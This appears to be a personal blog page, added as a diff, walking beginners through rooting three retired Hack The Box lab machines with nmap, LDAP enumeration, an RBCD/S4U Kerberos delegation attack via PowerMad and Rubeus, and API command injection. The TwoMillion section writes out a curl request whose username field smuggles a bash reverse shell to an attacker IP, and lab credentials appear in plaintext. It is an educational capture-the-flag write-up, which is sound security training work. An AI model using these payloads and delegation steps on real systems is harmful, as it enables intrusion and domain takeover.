@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+  <head>
+    <link rel="stylesheet" href="css/styles.css"></style>
+    <style>@import url('https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz,wght@0,6..12,400;0,6..12,700;1,6..12,400;1,6..12,700&display=swap');</style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Content TBD. Published February 2026.">
+    <meta name="author" content="Nick Muskopf-Stone">
+    <title>Byte Bashers: Easy Machines | Nick Muskopf-Stone</title>
+  </head>
+  <body>
+    <header class="nav" id="nav">
+      <a class="header-main" href="index.html">Nick Muskopf-Stone</a>
+      <a href="index.html">Home</a>
+      <a href="projects.html">Projects</a>
+      <a href="assets/resume.pdf" target="_blank">Resume</a>
+      <a href="contact.html">Contact</a>
+      <a href="javascript:void(0);" class="menu" onclick="toggleNav()">
+        <i class="fa fa-bars"></i>
+      </a>
+    </header>
+    <div class="cool-edge" style="background-image:url('assets/img/byte-easy-header.png');">
+      <div class="subject">
+        <h1>Byte Bashers: Easy Machines</h1>
+        <p>Rooting Easy Retired HTB Machines</p>
+      </div>
+    </div>
+    <div class="main">
+      <h1>What is this?</h1>
+      <div>
+        <p>If you're new to cybersecurity, the phrase "rooting a box" can sound mysterious or even a little intimidating. It conjures images of arcane commands, elite hackers, and skills you're not sure you have yet. The good news is that rooting a box isn't about being a genius or memorizing magic tricks. It's about learning how systems fail, how attackers think, and how small mistakes can be chained together into full control of a machine.</p>
+        <p>At its core, rooting a box means starting with no access at all and gradually working your way up until you have <b>root</b>, the highest level of privilege on a Linux system. On Windows machines, the highest level of privilege is <b>NT Authority\SYSTEM.</b> Along the way, you'll enumerate services, uncover weaknesses, exploit misconfigurations, and escalate privileges, step by step. Each box is a puzzle, and every puzzle teaches you something new about real-world security.</p>
+        <p>This article is written for people starting from zero. You don't need prior experience with hacking, penetration testing, or security tools to follow along. We'll focus first on what rooting is and why it works before introducing the tools and techniques used in practice. By the end, you should not only understand how people root machines, but also why these skills matter and how they translate beyond the problem into real security knowledge. In the <i>Byte Bashers</i> series, I will take on the role of a hacker as I root three virtual machines hosted by Hack The Box: <b>Cap, Support</b>, and <b>TwoMillion</b>.</p>
+        <h2>Disclaimer</h2>
+        <p>Please note that this article is for <b>educational purposes only</b>. The attacks listed in this article have been ethically performed on machines in virtual environments with <b>explicit permission</b> from Hack The Box. Replicating these attacks in real-world environments without permission is a great way to get in trouble. Always make sure you have proper permission before attacking environments.</p>
+      </div>
+      <h1>Tools of the Trade</h1>
+      <div>
+        <p>As I walk through how to break into these boxes, I will be covering my methodology and the command-line tools that I use to secure root privileges. Since this is an introductory article, I will cover everything from a beginner's perspective - which is fitting, because I approached these machines with the same level of experience as a beginner.</p>
+        <h2>The Cyber Kill Chain</h2>
+        <p>The <b>Cyber Kill Chain</b> is a standardized cybersecurity framework that describes the sequential stages of a cyberattack. For each box, we follow the Chain:</p>
+        <ul>
+          <li><b>Reconnaissance</b>: Gather information about the target before launching an attack. Know what ports are open, what operating system or protocols are in use, and develop a strategy to attack.</li>
+          <li><b>Weaponization</b>: Using the intelligence from the Reconnaissance phase, we prepare exploits, payloads, or tooling that will be used against the target.</li>
+          <li><b>Delivery</b>: Sending the exploit, payload, credentials, or crafted request to the target.</li>
+          <li><b>Exploitation</b>: Triggering and executing the malicious payload on target systems.</li>
+          <li><b>Installation / Command and Control (C2)</b>: We don't cover these parts of the chain in this article, but common actions for attackers to pursue once they have completed exploitation is to leave a backdoor behind and/or use the owned machine to communicate back to the attacker's infrastructure.</li>
+          <li><b>Actions on Objectives</b>: Executing the ultimate goal. This could be performing privilege escalation, moving laterally within the system, or finding a user or root flag. In a real attack, this stage can involve data theft (exfiltration), data encryption (ransomware), network disruption, or the destruction of critical files.</li>
+        </ul>
+        <h2>Tools</h2>
+        <p>Here are some of the tools I will be using in this article:</p>
+        <ul>
+          <li><b>Bloodhound</b>: A powerful tool used to enumerate Active Directory (AD) structure with the help of an ingestor run on the target system. Mainly a reconnaissance tool, but great for identifying attack paths and privilege escalation opportunities.</li>
+          <li><b>Burp Suite</b>: An excellent suite of tools that allows for packet capture, creation, analysis, and weaponization. Can be used in multiple phases of the kill chain.</li>
+          <li><b>netcat (nc)</b>: Lightweight tool used to listen and connect to open ports. Commonly used to receive reverse shells in the exploitation/installation phases.</li>
+          <li><b>nmap</b>: Tool used for discovery of open ports. One of the very first actions performed against a target, great for reconnaissance. You will see port numbers and their protocols next to them for each box.</li>
+          <li><b>Wireshark</b>: GUI tool used to inspect and analyze network traffic in PCAP files. Great for analyzing communications between applications and servers, with plenty of ability to dig deeper and find hidden info. Found mainly in the reconnaissance phase.</li>
+        </ul>
+      </div>
+      <h1>Cap</h1>
+      <div>
+        <h3>Enumeration</h3>
+        <p>An initial <b>nmap</b> scan of Cap revealed three open ports:</p>
+        <ul>
+          <li><b>21</b> (FTP) running Vsftpd 3.0.3</li>
+          <li><b>22</b> (SSH) running OpenSSH 8.2p1 Ubuntu</li>
+          <li><b>80</b> (HTTP) with title "Security Dashboard" and header "gunicorn"</li>
+          <Li>Additionally, Nmap revealed that the OS was <b>Linux 4.X or 5.X</b></Li>
+        </ul>
+        <h3>Port 80 - HTTP</h3>
+        <div class="image-right">
+          <img src="assets/img/byte-cap-80.png" alt="NCAP data showing Nathan's password in plaintext. Captured from Hack The Box.">
+          <p>When we navigate to Port 80 on Firefox, we are greeted with a dashboard where we are already logged in as <b>Nathan</b>. We see information about security events, failed login attempts, and port scans. This appears to be a static website with a template by Colorlib, which we discover is a <b>WordPress template</b>.</p>
+          <p>We can use <b>dirbuster</b> to reveal information about how the website is structured:</p>
+          <ul>
+            <li>The <b>IP</b> page displays a console that runs <b>ifconfig</b> on the underlying VM.</li>
+            <li>The <b>netstat</b> page has similar behavior, running <b>netstat</b> on the underlying VM.</li>
+            <li>What might be interesting to us is the <b>Data</b> page. We can generate data using the <b>capture</b> endpoint, but we can also <b>enumerate through prior data scans.</b></li>
+          </ul>
+          <p>After playing around with the data page, we come across <b>Scan 0</b> which had some interesting data on it. We find that Nathan's <b>username and password</b> for the FTP server were shown here <b>in plaintext!</b> This is an immediate finding and we will use this to gain access to the FTP server living on the VM.</p>
+        </div>
+        <h3>Port 21 - FTP</h3>
+        <div class="image-left">
+          <img src="assets/img/byte-cap-21.png" alt="Readout from a Python script showing the developers' solution to overcome permissions issues with gunicorn and threads. Setting UID to 0 is a dangerous practice and may lead to privilege escalation.">
+          <p>We are able to login to Cap's FTP port using the username <b>nathan</b> and password <b>Buck3tH4TF0RM3!</b>. In the working directory, <b>/home/nathan</b>, there is a file <b>user.txt</b>. This is the <b>User</b> flag, submitted to HTB for scoring.</p>
+          <p>With some basic directory traversal, we find additional information when examining the underlying structure of the website. All of the files are write-protected, but there is an interesting example of how the website developers worked around permissions issues with gunicorn and threads. The Python binary on the system has the capability <b><code>cap_setuid</code></b> enabled, allowing it to execute <b><code>os.setuid(0)</code></b> and impersonate root. The <code>os.setuid</code> function allows users to set their own UIDs, which is how Linux determines roles and permissions on the system level. The UID <code>0</code> is particularly significant; this is the UID associated with <code>root</code>, the highest authority on the system. Further, the <code>cap_setuid</code> capability is a critical part of this exploit; without it, we would not be able to execute <code>os.setuid</code> and impersonate root. This will help us with our next task of <b>privilege escalation</b>, where we will assume  the role of <code>root</code> in an unintended way.</p>
+        </div>
+        <h3>Port 22 - SSH</h3>
+        <p>Fortunately, Nathan has the same SSH and FTP passwords. We can use the same credentials from earlier, <b>nathan:Buck3tH4TF0RM3!</b>, and we are able to navigate through the rest of the filesystem using SSH. One of the first things I do when establishing an SSH foothold is utilize <b>LinPEAS</b>, a quick program optimized for Linux environments that scans for vulnerabilities. LinPEAS identified that the Python 3.8 binary had the <b>cap_setuid</b> and  <b>cap_net_bind_service+eip</b> capabilities assigned, meaning it was capable of <b>root impersonation</b> as demonstrated by our findings in FTP. Knowing this, we are able to recreate the <b><code>setuid(0)</code></b> command inside the SSH session and expand upon this using a one-liner to spawn a reverse shell while impersonating <code>root</code>. Through these efforts, we are able to <b>completely own the system as <code>root</code>!</b></p>
+        <a style="display:flex;justify-content:center" href="assets/img/byte-cap-22.png" target="_blank">
+          <img src="assets/img/byte-cap-22.png" alt="Python script to spawn a reverse shell with root privileges. This exploit is for educational purposes only and does not work outside of HTB Cap VM.">
+        </a>
+      </div>
+      <h1>Support</h1>
+      <div>
+        <h3>Enumeration</h3>
+        <p>The initial nmap scan revealed a bunch of ports. Among the most pertinent are:</p>
+        <ul>
+          <li>Port <b>53</b>, for DNS</li>
+          <li>Port <b>445</b>, for SMB</li>
+          <li>Port <b>5985</b>, the default port for <b>Windows Remote Management (WinRM)</b> HTTP traffic</li>
+        </ul>
+        <h3>Port 53 - DNS</h3>
+        <p>We start with Port 53 for DNS traffic. From previous examples, we know HTB boxes usually follow a naming pattern of <b>boxname.htb</b> so we can use this in a <b>dig</b> query. We use the globally accessible IP with the <b>@</b> symbol and plug in the IP provided to us by HTB. The final query looks like this: <b>dig @10.XXX.XXX.XXX support.htb</b>. A few results come up:</p>
+        <ul>
+          <li>The nameserver used is <b>dc.support.htb</b></li>
+          <li>The <b>Start of Authority (SOA)</b> record is <b>dc.support.htb hostmaster.support.htb</b></li>
+          <li>Both of these will be valuable later. We will add both DC and Hostmaster to /etc/hosts as-is.</li>
+        </ul>
+        <a style="display:flex;justify-content:center" href="assets/img/byte-support-53.png" target="_blank">
+          <img src="assets/img/byte-support-53.png" alt="DNS retrieval record for Support box.">
+        </a>
+        <h3>Port 445 - SMB</h3>
+        <p>Next, we turn our attention to Port 445 and investigate what's happening with Support's SMB shares. We are immediately asked for credentials when connecting to this port, which we don't have right now. Upon initial inspection, there are six shares: ADMIN$ for the remote admin, C$ is the default share, IPC$ for remote IPC, NETLOGON and SYSVOL for logon server shares, and <b>support-tools</b>, which is not a traditional SMB share. This would be interesting to examine, and fortunately we are able to <b>mount the support-tools fileshare</b> using a couple of quick commands:</p>
+        <ul>
+          <li><code>mkdir support-tools</code></li>
+          <li><code>sudo mount //10.XXX.XXX.XXX/support-tools ./support-tools</code></li>
+          <li>No password needed... We have ported everything over!</li>
+        </ul> 
+        <p>Upon inspecting the support-tools share, we find a number of publicly-available tools, save for one: <b>Userinfo.exe.zip</b>. While we are in this folder, we aren't able to extract the ZIP, so we will move the file to another folder where we have write access and extract it there. Inside, we find <b>UserInfo.exe</b>, which we can execute in <b>Wine</b>. It appears this is a program designed to use <b>Lightweight Directory Access Protocol (LDAP)</b> to connect to Support. We can use <b>Wireshark</b> to examine the traffic in more detail. As it turns out, the key for LDAP authentication is <b>revealed in plaintext</b>, making it very easy for us to grab and connect to LDAP ourselves!</p>
+        <div class="image-both">
+          <div>
+            <a href="assets/img/byte-support-445-1.png" target="_blank">
+              <img src="assets/img/byte-support-445-1.png" alt="Wireshark transcript showing the successful connection to support\ldap." />
+            </a>
+            <p>Wireshark transcript showing the successful connection to <code>support\ldap</code>.</p>
+          </div>
+          <div>
+            <a href="assets/img/byte-support-445-2.png" target="_blank">
+              <img src="assets/img/byte-support-445-2.png" alt="Wireshark breakdown of LDAP request, revealing the authentication key in plaintext." />
+            </a>
+            <p>Wireshark breakdown of LDAP request, revealing the authentication key in plaintext.</p>
+          </div>
+        </div>
+        <p>We can connect to LDAP using <b>ldapsearch</b>: <b><code>ldapsearch -x -H ldap://10.XXX.XXX.XXX -D 'support\ldap' -w '{password}' -b 'cn=users,dc=support,dc=htb</code></b>. Of course, replace <code>{password}</code> with the password discovered from LDAP and make sure the base domain name (base DN) matches your findings from DNS search.</p>
+        <details>
+          <summary>Where does the Base DN come from?</summary>
+          <div>
+            <p>Typically on Windows machines, the users are in their own <b>Canonical Name (CN)</b> group called <code>users</code>. We chain this together with the DC information we pulled from <code>dig</code> and come up with the full argument for the <b>-b</b> parameter:</p>
+            <p><b><code>cn=users,dc=support,dc=htb</code></b></p>
+          </div>
+        </details>
+        <p>When we connect to the Users CN, we get a bunch of data in return, including a listing of all of the users on the app. The format most commonly observed is <b>lastname.firstname</b>, save for two accounts: <b>ldap</b> and <b>support</b>. When looking at the support account, we come across the <b>info</b> field, which has an interesting string: <b>Ironside47pleasure40Watchful</b>. This is most likely the password to the Support account, so we will take this along with us for the next portion of the box.</p>
+        <p>Finally, to gain a foothold into the Support box, we take the password from Support's info field and use <b>evil-winrm</b> to connect to the box on port 5985. Shortly after, we reach the <b>User flag</b>.</p>
+        <div class="image-both">
+          <div>
+            <a href="assets/img/byte-support-5985-1.png" target="_blank">
+              <img src="assets/img/byte-support-5985-1.png" alt="LDAP recovery of Support's password in plaintext from the info field." />
+            </a>
+            <p>LDAP recovery of Support's password in plaintext from the info field.</p>
+          </div>
+          <div>
+            <a href="assets/img/byte-support-5985-2.png" target="_blank">
+              <img src="assets/img/byte-support-5985-2.png" alt="Successful evil-winrm login over Port 5985 using credentials support:Ironside47pleasure40Watchful. We use whoami once inside to confirm identity." />
+            </a>
+            <p>Successful evil-winrm login over Port 5985. We use <code>whoami</code> once inside to confirm identity.</p>
+          </div>
+        </div>
+        <h3>Port 5985 - WinRM</h3>
+        <div class="image-right">
+          <img src="assets/img/byte-support-5985-3.png" style="max-width:300px" alt="Bloodhound graphic showing the AD relationship between Support, Shared Support Accounts, and the DC. Giving any group the GenericAll relationship, especially toward the DC, is dangerous and not recommended.">
+          <p>Now that we have a foothold into Support, the next step is to escalate our privileges to SYSTEM. We can use the <b>upload</b> command within evil-winrm to upload <b>WinPEAS</b>, a version of PEAS for Windows machines. Unfortunately, WinPEAS didn't give me any significant findings this time.</p>
+          <p>To further enumerate this box, we use <b>crackmapexec</b> to identify the target OS. We discover this machine is running <b>Windows Server 2022 Build 20348 x64</b>, which will become important later. We pair crackmapexec with <b>Bloodhound</b>, a way to graphically analyze AD structure. I followed Bloodhound's tutorials to deploy an ingestor and quickly discovered the domain structure. Something surprising came up: Support is a member of <b>Shared Support Accounts</b>, a group which has the <b><code>GenericAll</code></b> permission on the Domain Controller (DC). This is a critical part of our exploit process; <code>GenericAll</code> is a high-level permission that grants <b>full control</b> over an object. In this case, the Shared Support Accounts group has full control over the DC!</p>
+        </div>
+        <h3>Resource-Based Constrained Delegation (RBCD)</h3>
+        <div class="image-left">
+          <img src="assets/img/byte-support-rubeus.png" style="max-width:300px" alt="PowerShell script and response where ATA is applied to the AttackerComputer. Input is verified in the second step.">
+          <p>Our primary exploit involves abusing <b>Resource-Based Constrained Delegation (RBCD)</b> to crack and decrypt a Kerberos ticket. Here, we will trick Kerberos into granting tickets that we can decrypt offline and use credentials we harvest from said tickets to break into SYSTEM. Following the guide from <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution" target="_blank" rel="noopener">ired.team</a>, we can start to map out the process for our Kerberoasting attack:</p>
+        <ol>
+          <li>We have code execution in the context of <b>support</b> user (don't know which box),</li>
+          <li>User support has <b>GenericAll</b> privilege over a target computer <b>DC</b>,</li>
+          <li>User support created a new computer object <b>AttackerComputer</b> in AD,</li>
+          <li>User support leverages the WRITE privilege on the DC computer object and updates its object attribute <b><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> (ATA)</b> to enable the newly created computer AttackerComputer to impersonate and authenticate any domain user that can then access the target system DC.</li>
+          <li>DC trusts AttackerComputer due to the modified parameter ATA,</li>
+          <li>We request Kerberos tickets for AttackerComputer with ability to impersonate Administrator who is a Domain Admin,</li>
+          <li>Profit - We can now access the <b>C$</b> share of DC from the remote session.</li>
+        </ol>
+        <p>Here is how we replicate this:</p>
+        <ol>
+          <li>Make a new computer account. In this case, we create <b>AttackerComputer</b> using <b>PowerMad</b> as such: <code>Powershell -Command 'Import-Module ./Powermad.psm1; New-MachineAccount -MachineAccount "AttackerComputer" -Password (ConvertTo-SecureString -String "hacker" -AsPlainText -Force)'</code></li>
+          <li>Set the <b>msDS-AllowedToActOnBehalfOfOtherIdentity</b> (ATA) attribute on the target computer, <b>DC</b>. This will make DC trust us to do totally trustworthy things on its behalf. In this example, we have done this on behalf of Administrator.
+          <ul>
+            <li><code>$Attacker = Get-ADComputer -Identity "AttackerComputer"</code></li>
+            <li><code>Set-ADComputer -Identity "DC" -PrincipalsAllowedToDelegateToAccount $Attacker</code></li>
+            <li>Verify: <code>Get-ADComputer -Identity "DC" -Properties</code></li>
+            <li>You should see <b>AttackerComputer</b></li>
+          </ul></li>
+          <li>Next, we execute a <b>Service for User (S4U)</b> request with <b>Rubeus</b> to get a ticket for a privileged user. There are a couple of steps we need to do here:
+          <ul>
+            <li>First, Rubeus needs to generate the <b>rc4_hmac</b> hash (AKA the NT in NTLM) for the password we gave to AttackerComputer. (<code>Rubeus.exe hash /password:hacker /user:AttackerComputer /domain:support.htb</code>)</li>
+            <li>Next, we launch the S4U attack with Rubeus: <code>Rubeus.exe s4u /user:AttackerComputer$ /rc4:[NT hash] /impersonateuser:Administrator /msdsspn:cifs/DC.support.htb /ptt /nowrap</code></li>
+            <li>You should see a <b>S4U2proxy success!</b> message if this worked.</li>
+            <li>If you see Kerberos error codes, this did not work. Double-check everything, dot I's and cross T's, etc.</li>
+          </ul></li>
+        </ol>
+        <p><b>What can we do with this ticket?</b> We can attempt to crack this offline, or we can use <b>Impacket</b> to convert this ticket into <b>Ccache format</b>. Ccache is what Linux likes to use for authentication, and we need to convert our ticket away from Rubeus format anyway. Rubeus has a built-in script called <b>rubeustoccache.py</b> that takes your hash as input and spits out a KIRBI and a CCACHE file as output. Syntax is as so: <code>python rubeustoccache.py {HASH} admin.kirbi admin.ccache</code>. Don't forget that what Rubeus gives you is encoded in <b>Base64</b>! You'll need to decode it or use an additional tool to help with the encoding.</p>
+        <p>Now that our hash is in CCACHE format, we need to set an environment variable on our Kali Linux attackbox: <code>KRB5CCNAME</code>. In particular, we use the following command: <code>export KRB5CCNAME=admin.ccache</code>. This way we can use <b>psexec.py</b> without needing to provide a hash or password, and we can glide right into SYSTEM.</p>
+        <p>To complete our final attack into SYSTEM, we use the PSExec functionality provided by Impacket: <b><code>impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb</code></b>. This allows us to log in to Support directly as SYSTEM and capture the root flag!</p>
+        </div>
+        <div class="image-both">
+          <div>
+            <a href="assets/img/byte-support-s4u2.png" target="_blank">
+              <img src="assets/img/byte-support-s4u2.png" alt="Rubeus ticket impersonation via S4U attack." />
+            </a>
+            <p>Rubeus ticket impersonation via S4U attack.</p>
+          </div>
+          <div>
+            <a style="display:flex;justify-content:center" href="assets/img/byte-support-root.png" target="_blank">
+              <img src="assets/img/byte-support-root.png" alt="Final login as SYSTEM in the Support box.">
+            </a>
+            <p>Final login as SYSTEM in the Support box.</p>
+          </div>
+        </div>
+      </div>
+      <h1>TwoMillion</h1>
+      <div>
+        <h3>Enumeration</h3>
+        <p>An initial nmap scan reveals two open ports:</p>
+        <ul>
+          <li>Port <b>22</b>, SSH. This is likely where we will perform privilege escalation later, once we have obtained credentials.</li>
+          <li>Port <b>80</b>, HTTP. This is most likely where we start our investigation.</li>
+        </ul>
+        <h3>Port 80 - HTTP</h3>
+        <div class="image-left">
+          <img style="max-width:300px" src="assets/img/byte-twomillion-80-1.png" alt="API V1 documentation page, as rendered by Mozilla Firefox." />
+          <p>As part of my initial discovery into this website, I opened <b>Burp Suite</b> and opened a browser while Burp worked its magic in the background, building a sitemap while I navigated through the website. This website appears to be a copy of the HTB website from 2017. Part of this website involves an account creation challenge, which requires sending an API call to an endpoint and decoding some Base64 output. I won't spoil how to break through this puzzle, but there are plenty of guides online on how to do so (Or you can be curious and solve it yourself.)</p>
+          <p>After solving the invite challenge, we tab back to Burp and see what it has discovered in its sitemap. There was one area of interest: <b>/api/v1</b>, an endpoint that displays API documentation when we visit. There are three endpoints of interest:</p>
+          <ul>
+            <li><b>GET admin/auth</b>: Check if user is admin.</li>
+            <li><b>POST admin/vpn/generate</b>: Generate VPN for specific user.</li>
+            <li><b>PUT admin/settings/update</b>: Update user settings.</li>
+          </ul>
+          <p>We are most interested in the PUT command. We can send PUT requests to this endpoint and the API will tell us what we need to proceed. In this case, we need the email we created our account with, as well as a PHP Session ID (PHPSESSID), a header, and the <b>is_admin</b> flag set to 1 (because we want to become administrators). Doing so, we get a 200 OK response, confirming <b>we have escalated our application-level privileges to Admin within the website</b>. We can confirm using the admin GET endpoint - it comes back true!</p>
+          <a style="display:flex;justify-content:center" href="assets/img/byte-twomillion-80-2.png" target="_blank">
+            <img src="assets/img/byte-twomillion-80-2.png" alt="Positive auth endpoint check after escalating website privilege to Admin.">
+          </a>
+          </div>
+          <div class="image-right">
+            <a href="assets/img/byte-twomillion-80-3.png" target="_blank">
+              <img style="max-width:300px" src="assets/img/byte-twomillion-80-3.png" alt="Successful rev into www-data using the faulty POST request." />
+            </a>
+            <p>The next step is to use the <b>Admin VPN Generation</b> endpoint and perform some command injection on it. The VPN file interfaces with the host OS and it is vulnerable to malicious input. We will use this to our advantage to gain a foothold into the 2million machine. Like we did with the PUT endpoint, we can enumerate the POST endpoint to find what we need. In this case, we need a Username... And we discover that the username we put into this endpoint is part of the OVPN file sent back. We can exploit this using some escape characters. We only get a response back if we actually provide a username, but if we terminate the command with a <b>semicolon (;)</b> and end the next command with a <b>hash (#)</b> we can <b>chain two commands together</b> and only receive the response of the second command. This is likely because the server is simply processing a script in the fashion <code>generate_script(username)</code>. With our modification, it becomes <code>generate_script(username);{second command} #</code>. An example malicious username: <code>generate_script(hacker); whoami #</code> would return the hostname of the system processing this script.</p>
+            <p>Now that we know how to break this script, we can spawn a <b>reverse shell</b> to connect. I used the <b>Burp Repeater</b> in combination with a quick one-liner in Bash to do this: <code>curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID={Session ID} --header "content-type:application/json" --data '{"username":"hacker; bash -c 'bash -i >& /dev/tcp/10.XXX.XXX.XXX/4444 0>&1' #"}'</code>. Note that you may encounter quoting issues; that's why I switched from Curl to Burp Suite to deliver this payload. Regardless, the above request works, and we establish a foothold as <b>www-data</b> inside the machine.</p>
+          </div>
+          <h3>Upgrading the Command Line</h3>
+          <p>The next step is to take our reverse shell and find a way to upgrade our command line to SSH. While we enumerate the webserver, we come across the <b>user key</b> (locked behind the <b>Admin</b> folder) and an email from <b>ch4p</b> to <b>admin</b> and <b>g0blin</b>. This suggests we need to use <b>admin</b> as our user and perform privilege escalation from there. This also suggests the POC to use later on: <i>"There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasry. We can't get popped by that."</i></p>
+          <p>We also come across a <b>Database connection string</b> complete with username and password in plaintext: <b><code>admin:SuperDuperPass123</code></b>. We can use these credentials to upgrade our connection to SSH and control the <b>user</b> flag.</p>
+          <div class="image-both">
+          <div>
+            <a href="assets/img/byte-twomillion-www-1.png" target="_blank">
+              <img src="assets/img/byte-twomillion-www-1.png" alt="The mail message left to admin from ch4p." />
+            </a>
+            <p>The mail message left to admin from ch4p.</p>
+          </div>
+          <div>
+            <a style="display:flex;justify-content:center" href="assets/img/byte-twomillion-www-2.png" target="_blank">
+              <img src="assets/img/byte-twomillion-www-2.png" alt="Direct login from the database file into SSH. Yes, we have mail.">
+            </a>
+            <p>Direct login from the database file into SSH. Yes, we have mail.</p>
+          </div>
+        </div>
+        <h3>Elevating to Root</h3>
+        <p>Let's go back and look at that email. The CVE being referenced is from 2023 and has to do with <b>OverlayFS/FUSE</b>. This is most likely <b>CVE-2023-0386</b> which has a nice POC online. We used the POC on 2M and it worked on the first try! We successfully claim the <b>root</b> flag.</p>
+        <a style="display:flex;justify-content:center" href="assets/img/byte-twomillion-22.png" target="_blank">
+          <img src="assets/img/byte-twomillion-22.png" alt="Quickly running the POC from CVE-2023-0386 and claiming the Root flag.">
+        </a>
+      </div>
+      <h1>What Did We Learn?</h1>
+      <div>
+        <p>Rooting boxes is about much more than collecting flags or running exploits you found online. Each box teaches practical lessons about how systems break down in the real world and how attackers can chain small weaknesses together into meaningful compromise. Through each box, we learned how important <b>enumeration</b> is. Open ports, exposed fileshares, insecure API endpoints, plaintext credentials, and weak AD permissions all became entry points because the systems revealed more information than intended. In many cases, the hardest part was not the exploit itself, but knowing where to look and recognizing what mattered.</p>
+        <p>Most importantly, these exercises build a mindset. Rooting boxes teaches patience, methodology, and curiosity. You learn how to document findings, test assumptions, troubleshoot failed exploits, and adapt when your first idea does not work. These are the same skills used by penetration testers, defenders, system administrators, and security engineers in real environments. The goal is not simply to become good at Hack The Box, but rather to better understand how systems communicate, how trust relationships function, and how attackers think so you can recognize and defend against these weaknesses in the future.</p>
+      </div>
+      <p><i>Published May 2026</i></p>
+    </div>
+    <footer>
+      <a href="https://www.github.com/nmuskopf">
+        <img src="assets/img/github.png" alt="Click to visit my GitHub repository">
+      </a>
+      <a href="https://www.linkedin.com/in/nmuskopfstone">
+        <img src="assets/img/linkedin.png" alt="Click to visit my LinkedIn profile">
+      </a>
+      <a href="mailto:nick@nmuskopf.com">
+        <img src="assets/img/email.png" alt="Click to send me an email message at nick@nmuskopf.com">
+      </a>
+      <p>© 2026 Nick Muskopf-Stone</p>
+    </footer>
+  </body>
+  <script src="js/scripts.js"></script>
+</html>
